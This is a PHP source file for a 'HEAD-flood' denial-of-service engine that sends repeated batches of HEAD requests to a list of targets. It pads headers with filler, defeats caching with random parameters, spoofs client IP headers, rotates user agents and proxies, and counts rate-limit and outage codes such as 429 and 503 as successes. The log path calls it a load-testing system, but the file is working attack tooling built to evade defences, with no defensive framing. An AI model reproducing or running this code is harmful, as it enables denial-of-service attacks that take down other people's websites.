<?php

class HEADFloodEngine {
    private $db;
    private $config;
    private $stealthEngine;
    
    public function __construct($database, $config = []) {
        $this->db = $database;
        $this->config = array_merge($this->getDefaultConfig(), $config);
        $this->stealthEngine = null;
    }
    
    public function getDefaultConfig() {
        return [
            'method' => 'HEAD',
            'threads' => 150,
            'duration' => 300,
            'request_rate' => 300,
            'header_amplification' => true,
            'cache_bypass' => true,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'header_spoofing' => true,
            'connection_reuse' => false,
            'custom_headers' => true
        ];
    }
    
    public function start($groupId, $targets, $profile) {
        $this->logMessage("Starting HEAD-flood attack for group: $groupId");
        
        if ($this->config['stealth_enabled']) {
            $this->initializeStealth($groupId);
        }
        
        $attackResults = [];
        
        foreach ($targets as $target) {
            $targetResult = $this->attackTarget($target, $groupId, $profile);
            $attackResults[] = $targetResult;
        }
        
        return [
            'attack_method' => 'head-flood',
            'group_id' => $groupId,
            'targets' => count($targets),
            'results' => $attackResults,
            'config' => $this->config
        ];
    }
    
    private function attackTarget($target, $groupId, $profile) {
        $this->logMessage("HEAD-flood attack on target: $target");
        
        $startTime = time();
        $endTime = $startTime + $this->config['duration'];
        $requestCount = 0;
        $successCount = 0;
        $errorCodes = [];
        $headerBytes = 0;
        
        while (time() < $endTime) {
            $batchResults = $this->executeHEADBatch($target, $groupId, $profile);
            
            $requestCount += $batchResults['requests'];
            $successCount += $batchResults['success'];
            $headerBytes += $batchResults['header_bytes'];
            
            foreach ($batchResults['error_codes'] as $code => $count) {
                $errorCodes[$code] = ($errorCodes[$code] ?? 0) + $count;
            }
            
            if ($this->config['stealth_enabled'] && $requestCount % 100 === 0) {
                $this->rotateStealthComponents($groupId);
            }
            
            usleep(1000000 / $this->config['request_rate']);
        }
        
        $duration = time() - $startTime;
        $rps = $duration > 0 ? round($requestCount / $duration, 2) : 0;
        $headerKbps = $duration > 0 ? round(($headerBytes / 1024) / $duration, 2) : 0;
        
        $this->logMessage("HEAD-flood completed for $target: $requestCount requests, $successCount success, RPS: $rps, Header KB/s: $headerKbps");
        
        return [
            'target' => $target,
            'duration' => $duration,
            'total_requests' => $requestCount,
            'successful_requests' => $successCount,
            'error_codes' => $errorCodes,
            'rps' => $rps,
            'header_bytes_sent' => $headerBytes,
            'header_kbps' => $headerKbps,
            'success_rate' => $requestCount > 0 ? round(($successCount / $requestCount) * 100, 2) : 0
        ];
    }
    
    private function executeHEADBatch($target, $groupId, $profile) {
        $batchSize = $this->config['threads'];
        $requests = 0;
        $success = 0;
        $errorCodes = [];
        $headerBytes = 0;
        
        for ($i = 0; $i < $batchSize; $i++) {
            $result = $this->executeHEADRequest($target, $groupId, $profile);
            $requests++;
            $headerBytes += $result['header_bytes'];
            
            if ($result['success']) {
                $success++;
            }
            
            $code = $result['http_code'];
            $errorCodes[$code] = ($errorCodes[$code] ?? 0) + 1;
        }
        
        return [
            'requests' => $requests,
            'success' => $success,
            'error_codes' => $errorCodes,
            'header_bytes' => $headerBytes
        ];
    }
    
    private function executeHEADRequest($target, $groupId, $profile) {
        $headers = $this->generateAmplifiedHeaders($target, $profile);
        $proxy = $this->getProxy();
        $url = $this->generateTargetURL($target);
        
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_CUSTOMREQUEST => 'HEAD',
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_NOBODY => true,
            CURLOPT_HEADER => true,
            CURLOPT_TIMEOUT => 8,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => $this->getUserAgent(),
            CURLOPT_FRESH_CONNECT => $this->config['connection_reuse'] ? false : true,
            CURLOPT_FORBID_REUSE => $this->config['connection_reuse'] ? false : true
        ]);
        
        if ($proxy && $this->config['proxy_rotation']) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
        }
        
        $startTime = microtime(true);
        $response = curl_exec($ch);
        $responseTime = round((microtime(true) - $startTime) * 1000);
        
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $error = curl_error($ch);
        
        curl_close($ch);
        
        $success = ($httpCode >= 200 && $httpCode < 300) || in_array($httpCode, [403, 404, 429, 503, 524]);
        
        if (!$success && $error) {
            $this->logMessage("HEAD request error for $target: $error");
        }
        
        $headerBytes = $this->calculateHeaderBytes($headers);
        
        return [
            'success' => $success,
            'http_code' => $httpCode,
            'response_time' => $responseTime,
            'header_bytes' => $headerBytes,
            'error' => $error
        ];
    }
    
    private function generateAmplifiedHeaders($target, $profile) {
        $baseHeaders = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7,de;q=0.6,it;q=0.5,pt;q=0.4,ru;q=0.3,ja;q=0.2,ko;q=0.1',
            'Accept-Encoding: gzip, deflate, br, compress, identity',
            'Connection: keep-alive',
            'Cache-Control: no-cache, no-store, must-revalidate, max-age=0',
            'Pragma: no-cache',
            'Upgrade-Insecure-Requests: 1',
            'Sec-Fetch-Dest: document',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: none',
            'Sec-Fetch-User: ?1'
        ];
        
        if ($this->config['header_amplification']) {
            $amplifiedHeaders = $this->generateLargeHeaders();
            $baseHeaders = array_merge($baseHeaders, $amplifiedHeaders);
        }
        
        if ($this->config['cache_bypass']) {
            $cacheBypassHeaders = $this->generateCacheBypassHeaders();
            $baseHeaders = array_merge($baseHeaders, $cacheBypassHeaders);
        }
        
        if ($this->config['header_spoofing']) {
            $spoofedHeaders = $this->generateSpoofedHeaders($target);
            foreach ($spoofedHeaders as $key => $value) {
                $baseHeaders[] = "$key: $value";
            }
        }
        
        if ($this->config['custom_headers']) {
            $customHeaders = $this->generateCustomHeaders();
            $baseHeaders = array_merge($baseHeaders, $customHeaders);
        }
        
        return $baseHeaders;
    }
    
    private function generateLargeHeaders() {
        return [
            'X-Custom-Data: ' . str_repeat('A', 1000),
            'X-Large-Header: ' . str_repeat('B', 800),
            'X-Amplification: ' . str_repeat('C', 600),
            'X-Padding: ' . str_repeat('D', 400),
            'X-Extra-Data: ' . str_repeat('E', 200),
            'X-Filler: ' . str_repeat('F', 100)
        ];
    }
    
    private function generateCacheBypassHeaders() {
        $timestamp = time();
        $random = rand(100000, 999999);
        
        return [
            "X-Cache-Bypass: $timestamp",
            "X-Random-ID: $random",
            "X-Timestamp: $timestamp",
            "X-Unique: " . uniqid(),
            "X-Nonce: " . md5($timestamp . $random),
            "If-Modified-Since: " . gmdate('D, d M Y H:i:s', $timestamp - 1) . ' GMT',
            "If-None-Match: \"" . md5($random) . "\"",
            "X-Requested-With: XMLHttpRequest"
        ];
    }
    
    private function generateCustomHeaders() {
        return [
            'X-Forwarded-Proto: https',
            'X-Forwarded-Port: 443',
            'X-Scheme: https',
            'X-Request-ID: ' . uniqid(),
            'X-Correlation-ID: ' . uniqid(),
            'X-Session-ID: ' . md5(time()),
            'X-Client-Version: 1.0.0',
            'X-API-Version: v1',
            'X-Platform: web',
            'X-Device-Type: desktop',
            'X-Browser-Engine: webkit',
            'X-Render-Engine: blink'
        ];
    }
    
    private function generateTargetURL($target) {
        if (!$this->config['cache_bypass']) {
            return $target;
        }
        
        $separator = strpos($target, '?') !== false ? '&' : '?';
        $cacheBypassParams = [
            'cb=' . time(),
            'r=' . rand(100000, 999999),
            'v=' . uniqid(),
            't=' . microtime(true)
        ];
        
        return $target . $separator . implode('&', $cacheBypassParams);
    }
    
    private function calculateHeaderBytes($headers) {
        $totalBytes = 0;
        foreach ($headers as $header) {
            $totalBytes += strlen($header) + 2; // +2 for \r\n
        }
        return $totalBytes;
    }
    
    private function generateSpoofedHeaders($target) {
        return [
            'X-Forwarded-For' => $this->generateRandomIP(),
            'X-Real-IP' => $this->generateRandomIP(),
            'X-Originating-IP' => $this->generateRandomIP(),
            'X-Remote-IP' => $this->generateRandomIP(),
            'X-Forwarded-Host' => parse_url($target, PHP_URL_HOST),
            'CF-Connecting-IP' => $this->generateRandomIP(),
            'True-Client-IP' => $this->generateRandomIP(),
            'X-Cluster-Client-IP' => $this->generateRandomIP()
        ];
    }
    
    private function generateRandomIP() {
        return rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
    }
    
    private function getUserAgent() {
        if (!$this->config['ua_rotation']) {
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
        }
        
        $userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
        ];
        
        return $userAgents[array_rand($userAgents)];
    }
    
    private function getProxy() {
        if (!$this->config['proxy_rotation'] || !$this->db) {
            return null;
        }
        
        $proxies = $this->db->getActiveProxies(1);
        if (!empty($proxies)) {
            $proxy = $proxies[0];
            return $proxy['ip_address'] . ':' . $proxy['port'];
        }
        
        return null;
    }
    
    private function initializeStealth($groupId) {
        $this->logMessage("Initializing stealth components for HEAD-flood group: $groupId");
        $this->stealthEngine = true;
    }
    
    private function rotateStealthComponents($groupId) {
        if (!$this->stealthEngine) {
            return;
        }
        
        $this->logMessage("Rotating stealth components for HEAD-flood group: $groupId");
    }
    
    private function logMessage($message) {
        $logFile = '/home/ftcceelg/load_testing_system/logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        file_put_contents($logFile, "[$timestamp] HEAD_FLOOD: $message\n", FILE_APPEND | LOCK_EX);
    }
}
?>
